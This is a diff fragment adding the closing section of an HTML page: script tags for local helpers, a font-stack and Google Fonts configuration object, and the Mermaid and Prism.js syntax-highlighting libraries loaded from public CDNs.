+    <script defer src="../../../src/anki-cards.js"></script>
+    <script defer src="../../../src/activity-popover.js"></script>
+    <script>
+  window.__DEV_FONT_EXTRA = {
+    stacks: {
+      system: 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      forma:  '"Forma", Tahoma, "Segoe UI", Arial, sans-serif',
+      ia:     '"iA Writer Duospace", ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace',
+      jb:     '"JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+
+      inter: '"Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans", Arial, sans-serif',
+      roboto: '"Roboto", system-ui, -apple-system, "Segoe UI", "Noto Sans", Arial, sans-serif',
+      notosans: '"Noto Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ibmplexsans: '"IBM Plex Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ptsans: '"PT Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      opensans: '"Open Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      manrope: '"Manrope", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      golos: '"Golos Text", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      firasans: '"Fira Sans", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      ubuntu: '"Ubuntu", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      mulish: '"Mulish", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      rubik: '"Rubik", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      exo2: '"Exo 2", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      lato: '"Lato", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      montserrat: '"Montserrat", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif',
+      oswald: '"Oswald", "Noto Sans", system-ui, -apple-system, "Segoe UI", Arial, sans-serif',
+      notoserif: '"Noto Serif", Georgia, "Times New Roman", serif',
+      ptserif: '"PT Serif", Georgia, "Times New Roman", serif',
+      merriweather: '"Merriweather", Georgia, "Times New Roman", serif',
+      lora: '"Lora", Georgia, "Times New Roman", serif',
+      literata: '"Literata", Georgia, "Times New Roman", serif',
+      playfair: '"Playfair Display", "Times New Roman", Georgia, serif',
+      jbmono: '"JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      firacode: '"Fira Code", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      plexmono: '"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace',
+      ptmono: '"PT Mono", ui-monospace, Menlo, Consolas, monospace',
+      ubuntumono: '"Ubuntu Mono", ui-monospace, Menlo, Consolas, monospace',
+      cousine: '"Cousine", ui-monospace, Menlo, Consolas, monospace',
+    },
+    webfonts: {
+      forma: '',
+      ia:    'https://fonts.googleapis.com/css2?family=IA+Writer+Duospace&display=swap',
+      jb:    'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap',
+
+      inter: 'https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap&subset=cyrillic',
+      roboto: 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap&subset=cyrillic',
+      notosans: 'https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ibmplexsans: 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ptsans: 'https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&display=swap&subset=cyrillic',
+      opensans: 'https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      manrope: 'https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700&display=swap&subset=cyrillic',
+      golos: 'https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;600;700&display=swap&subset=cyrillic',
+      firasans: 'https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;600;700&display=swap&subset=cyrillic',
+      ubuntu: 'https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap&subset=cyrillic',
+      mulish: 'https://fonts.googleapis.com/css2?family=Mulish:wght@400;600;700&display=swap&subset=cyrillic',
+      rubik: 'https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap&subset=cyrillic',
+      exo2: 'https://fonts.googleapis.com/css2?family=Exo+2:wght@400;600;700&display=swap&subset=cyrillic',
+      lato: 'https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap&subset=cyrillic',
+      montserrat: 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap&subset=cyrillic',
+      oswald: 'https://fonts.googleapis.com/css2?family=Oswald:wght@400;600&display=swap&subset=cyrillic',
+      notoserif: 'https://fonts.googleapis.com/css2?family=Noto+Serif:wght@400;600;700&display=swap&subset=cyrillic',
+      ptserif: 'https://fonts.googleapis.com/css2?family=PT+Serif:wght@400;700&display=swap&subset=cyrillic',
+      merriweather: 'https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap&subset=cyrillic',
+      lora: 'https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&display=swap&subset=cyrillic',
+      literata: 'https://fonts.googleapis.com/css2?family=Literata:wght@400;600;700&display=swap&subset=cyrillic',
+      playfair: 'https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap&subset=cyrillic',
+      jbmono: 'https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap&subset=cyrillic',
+      firacode: 'https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap&subset=cyrillic',
+      plexmono: 'https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&display=swap&subset=cyrillic',
+      ptmono: 'https://fonts.googleapis.com/css2?family=PT+Mono&display=swap&subset=cyrillic',
+      ubuntumono: 'https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&display=swap&subset=cyrillic',
+      cousine: 'https://fonts.googleapis.com/css2?family=Cousine:wght@400;700&display=swap&subset=cyrillic',
+    }
+  };
+</script>
+
+    <!-- script defer src="../../../src/dev-fonts.js"></script -->
+  <script type="module" async>import mermaid from "https://unpkg.com/mermaid@11.11.0/dist/mermaid.esm.min.mjs";document.addEventListener('DOMContentLoaded', mermaid.initialize({"loadOnSave":true}));</script>
+  <script defer src="../../../src/toc-autohide.js"></script>
+<script>window.Prism = window.Prism || {}; Prism.manual = true;</script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+
+<!-- Языки, которые реально используешь -->
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-sql.min.js" defer></script>
+
+<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/command-line/prism-command-line.min.js" defer></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    document.querySelectorAll('pre.command-line > code').forEach(Prism.highlightElement);
+  });
+</script>
+  </body>
+  
+</html>
